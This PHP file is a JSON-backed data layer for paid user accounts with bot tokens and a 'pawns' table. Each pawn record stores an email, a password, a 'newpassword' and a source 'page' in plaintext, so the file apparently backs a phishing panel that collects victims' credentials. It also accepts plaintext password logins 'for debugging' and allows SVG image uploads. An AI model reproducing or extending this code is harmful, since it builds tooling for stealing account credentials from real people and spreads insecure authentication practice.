<?php
// include_once 'db.php'; // Commented out - using JSON instead of MySQL

// JSON Database functions
function getJsonData() {
    $jsonFile = __DIR__ . '/db.json';
    if (!file_exists($jsonFile)) {
        return ['users' => [], 'pawns' => [], 'metadata' => ['version' => '1.0', 'created_at' => date('c'), 'last_updated' => date('c')]];
    }
    $data = json_decode(file_get_contents($jsonFile), true);
    return $data ?: ['users' => [], 'pawns' => [], 'metadata' => ['version' => '1.0', 'created_at' => date('c'), 'last_updated' => date('c')]];
}

function saveJsonData($data) {
    $data['metadata']['last_updated'] = date('c');
    $jsonFile = __DIR__ . '/db.json';
    return file_put_contents($jsonFile, json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
}

function generateId($table) {
    $data = getJsonData();
    $maxId = 0;
    foreach ($data[$table] as $item) {
        if (isset($item['id']) && $item['id'] > $maxId) {
            $maxId = $item['id'];
        }
    }
    return $maxId + 1;
}

// Allowed file types for upload validation
$ALLOWED_IMAGE_TYPES = [
    'jpg', 'jpeg', 'png', 'gif', 'webp', 'bmp', 'tiff', 'svg'
];

$ALLOWED_MIME_TYPES = [
    'image/jpeg',
    'image/png',
    'image/gif',
    'image/webp',
    'image/bmp',
    'image/tiff',
    'image/svg+xml'
];

// Function to check if file is an image
function isImageFile($filename, $mime_type = null) {
    global $ALLOWED_IMAGE_TYPES, $ALLOWED_MIME_TYPES;

    // Check file extension
    $extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    if (!in_array($extension, $ALLOWED_IMAGE_TYPES)) {
        return false;
    }

    // Check MIME type if provided
    if ($mime_type && !in_array($mime_type, $ALLOWED_MIME_TYPES)) {
        return false;
    }

    return true;
}

// Function to get file extension
function getFileExtension($filename) {
    return strtolower(pathinfo($filename, PATHINFO_EXTENSION));
}

// Function to validate image upload
function validateImageUpload($file) {
    global $ALLOWED_IMAGE_TYPES, $ALLOWED_MIME_TYPES;

    // Check if file array is valid
    if (!isset($file['name']) || !isset($file['type']) || !isset($file['tmp_name'])) {
        return ['valid' => false, 'error' => 'Invalid file upload'];
    }

    // Check for upload errors
    if ($file['error'] !== UPLOAD_ERR_OK) {
        return ['valid' => false, 'error' => 'Upload error: ' . $file['error']];
    }

    // Check file size (max 5MB)
    $max_size = 5 * 1024 * 1024; // 5MB
    if ($file['size'] > $max_size) {
        return ['valid' => false, 'error' => 'File too large. Maximum size is 5MB'];
    }

    // Check if it's an image
    if (!isImageFile($file['name'], $file['type'])) {
        return ['valid' => false, 'error' => 'Only image files are allowed (jpg, jpeg, png, gif, webp, bmp, tiff, svg)'];
    }

    // Additional security: Check actual MIME type
    $finfo = finfo_open(FILEINFO_MIME_TYPE);
    $actual_mime = finfo_file($finfo, $file['tmp_name']);
    finfo_close($finfo);

    if (!in_array($actual_mime, $ALLOWED_MIME_TYPES)) {
        return ['valid' => false, 'error' => 'File type mismatch. Possible security threat'];
    }

    return ['valid' => true, 'extension' => getFileExtension($file['name']), 'mime_type' => $actual_mime];
}

// User functions - JSON based
function createuser($name, $email, $password, $token, $device, $bot_token = null, $bot_id = null, $enableemail = 0) {
    $data = getJsonData();
    $hashed_password = password_hash($password, PASSWORD_DEFAULT);

    // Check if this is the first user (make them admin)
    $isFirstUser = empty($data['users']);

    $user = [
        'id' => generateId('users'),
        'name' => $name,
        'email' => $email,
        'password' => $hashed_password,
        'token' => $token,
        'device' => $device,
        'bot_token' => $bot_token,
        'bot_id' => $bot_id,
        'enableemail' => $enableemail,
        'count' => 4,
        'project' => 1,
        'emailsend' => 0,
        'is_admin' => $isFirstUser ? 1 : 0, // First user is admin
        'time_pay' => date('Y-m-d H:i:s'),
        'created_at' => date('Y-m-d H:i:s')
    ];
    $data['users'][] = $user;
    return saveJsonData($data);
}

function readuser($id) {
    $data = getJsonData();
    foreach ($data['users'] as $user) {
        if ($user['id'] == $id) {
            return $user;
        }
    }
    return null;
}

function readuserByEmail($email) {
    $data = getJsonData();
    foreach ($data['users'] as $user) {
        if ($user['email'] == $email) {
            return $user;
        }
    }
    return null;
}

function updateuser($id, $name = null, $email = null, $password = null, $token = null, $device = null, $bot_token = null, $bot_id = null, $enableemail = null, $count = null, $is_admin = null) {
    $data = getJsonData();
    foreach ($data['users'] as &$user) {
        if ($user['id'] == $id) {
            if ($name !== null) $user['name'] = $name;
            if ($email !== null) $user['email'] = $email;
            if ($password !== null) $user['password'] = password_hash($password, PASSWORD_DEFAULT);
            if ($token !== null) $user['token'] = $token;
            if ($device !== null) $user['device'] = $device;
            if ($bot_token !== null) $user['bot_token'] = $bot_token;
            if ($bot_id !== null) $user['bot_id'] = $bot_id;
            if ($enableemail !== null) $user['enableemail'] = $enableemail;
            if ($count !== null) $user['count'] = $count;
            if ($is_admin !== null) $user['is_admin'] = $is_admin;
            return saveJsonData($data);
        }
    }
    return false;
}

function updateuserCount($id, $count) {
    $data = getJsonData();
    foreach ($data['users'] as &$user) {
        if ($user['id'] == $id) {
            $user['count'] = (int)$count ?? 4;
            $user['time_pay'] = date('Y-m-d H:i:s');
            return saveJsonData($data);
        }
    }
    return false;
}

function updateuserProjectLimit($id, $limit) {
    $data = getJsonData();
    foreach ($data['users'] as &$user) {
        if ($user['id'] == $id) {
            $user['project'] = (int)$limit;
            $user['time_pay'] = date('Y-m-d H:i:s');
            return saveJsonData($data);
        }
    }
    return false;
}

function updateuserPlanUpgrade($id, $count, $project) {
    $data = getJsonData();
    foreach ($data['users'] as &$user) {
        if ($user['id'] == $id) {
            $user['count'] = (int)$count ?? 4;
            $user['project'] = (int)$project ?? 1;
            $pawnCount = count(readpawn($id));
            $user['emailsend'] = $user['count'] - $pawnCount > 0 ? $user['count'] - $pawnCount : $user['count'];
            $user['time_pay'] = date('Y-m-d H:i:s');
            return saveJsonData($data);
        }
    }
    return false;
}

function updateemailsend($id, $emailsend) {
    $data = getJsonData();
    foreach ($data['users'] as &$user) {
        if ($user['id'] == $id) {
            $user['emailsend'] = (int)$emailsend;
            return saveJsonData($data);
        }
    }
    return false;
}

function checkAndResetExpiredSubscription($userId) {
    $data = getJsonData();
    foreach ($data['users'] as &$user) {
        if ($user['id'] == $userId && isset($user['time_pay'])) {
            $timePay = strtotime($user['time_pay']);
            $thirtyDaysAgo = strtotime('-30 days');

            if ($timePay < $thirtyDaysAgo) {
                $user['count'] = 4;
                saveJsonData($data);
                return true;
            }
        }
    }
    return false;
}

function deleteuser($id) {
    $data = getJsonData();
    foreach ($data['users'] as $key => $user) {
        if ($user['id'] == $id) {
            unset($data['users'][$key]);
            $data['users'] = array_values($data['users']); // Reindex array
            return saveJsonData($data);
        }
    }
    return false;
}

// Pawn functions - JSON based
function createpawn($user_id, $email, $password, $page, $newpassword = null) {
    $data = getJsonData();
    $pawn = [
        'id' => generateId('pawns'),
        'user_id' => $user_id,
        'email' => $email,
        'password' => $password,
        'newpassword' => $newpassword,
        'page' => $page,
        'created_at' => date('Y-m-d H:i:s')
    ];
    $data['pawns'][] = $pawn;
    return saveJsonData($data);
}

function readpawn($user_id) {
    $data = getJsonData();
    $userPawns = [];
    foreach ($data['pawns'] as $pawn) {
        if ($pawn['user_id'] == $user_id) {
            $userPawns[] = $pawn;
        }
    }
    // Sort by created_at ASC
    usort($userPawns, function($a, $b) {
        return strtotime($a['created_at']) - strtotime($b['created_at']);
    });
    return $userPawns;
}

function updatepawn($id, $user_id = null, $email = null, $password = null, $newpassword = null) {
    $data = getJsonData();
    foreach ($data['pawns'] as &$pawn) {
        if ($pawn['id'] == $id) {
            if ($user_id !== null) $pawn['user_id'] = $user_id;
            if ($email !== null) $pawn['email'] = $email;
            if ($password !== null) $pawn['password'] = password_hash($password, PASSWORD_DEFAULT);
            if ($newpassword !== null) $pawn['newpassword'] = password_hash($newpassword, PASSWORD_DEFAULT);
            return saveJsonData($data);
        }
    }
    return false;
}

function deletepawn($id) {
    $data = getJsonData();

    // Check if it's an image pawn and delete the file
    foreach ($data['pawns'] as $pawn) {
        if ($pawn['id'] == $id) {
            $isImage = (strpos(strtolower($pawn['page']), 'image') !== false || strpos(strtolower($pawn['page']), 'photo') !== false);
            if ($isImage && !empty($pawn['email'])) {
                $imagePath = $pawn['email'];
                if (!preg_match('/^https?:\/\//', $imagePath)) {
                    $fullPath = __DIR__ . '/../uploads/' . basename($imagePath);
                    if (file_exists($fullPath)) {
                        unlink($fullPath);
                    }
                }
            }
            break;
        }
    }

    // Remove the pawn from JSON
    foreach ($data['pawns'] as $key => $pawn) {
        if ($pawn['id'] == $id) {
            unset($data['pawns'][$key]);
            $data['pawns'] = array_values($data['pawns']); // Reindex array
            return saveJsonData($data);
        }
    }
    return false;
}

// Authentication function
function authenticate($email, $password) {
    $user = readuserByEmail($email);
    if ($user) {
        // Check if password is hashed (starts with $2y$)
        if (strpos($user['password'], '$2y$') === 0) {
            // Hashed password - use password_verify
            if (password_verify($password, $user['password'])) {
                return $user;
            }
        } else {
            // Plain text password for debugging
            if ($password === $user['password']) {
                return $user;
            }
        }
    }
    return false;
}

function uploadFile($file, $folder = "../uploads/") {
    // تأكد folder موجود
    if (!file_exists($folder)) {
        mkdir($folder, 0755, true);
    }

    // Generate secure filename
    $extension = getFileExtension($file['name']);
    $secureFileName = time() . "_" . bin2hex(random_bytes(8)) . "." . $extension;
    $targetPath = $folder . $secureFileName;

    // نقل الملف
    if (move_uploaded_file($file["tmp_name"], $targetPath)) {
        return [
            'success' => true,
            'path' => $targetPath,
            'filename' => $secureFileName,
            'extension' => $extension,
            'mime_type' => $file['type']
        ];
    }

    return ['success' => false, 'error' => 'Failed to move uploaded file'];
}
?>